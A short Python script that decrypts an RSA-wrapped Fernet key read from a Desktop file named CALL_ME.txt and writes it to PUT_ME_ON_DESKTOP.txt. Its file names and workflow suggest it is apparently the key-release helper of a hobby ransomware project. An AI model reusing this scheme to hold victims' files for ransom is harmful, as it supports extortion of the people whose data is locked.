from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import os

sysRoot = os.path.expanduser('~')

with open(f'{sysRoot}/Desktop/CALL_ME.txt', 'rb') as fk:
    fernet_key = fk.read()

private_key = RSA.import_key(open('private_key.pem').read())
private_crypter = PKCS1_OAEP.new(private_key)

decrypt_fernet_key = private_crypter.decrypt(fernet_key)
with open('PUT_ME_ON_DESKTOP.txt', 'wb') as f:
    f.write(decrypt_fernet_key)
    f.close()

print(fernet_key)
print(decrypt_fernet_key)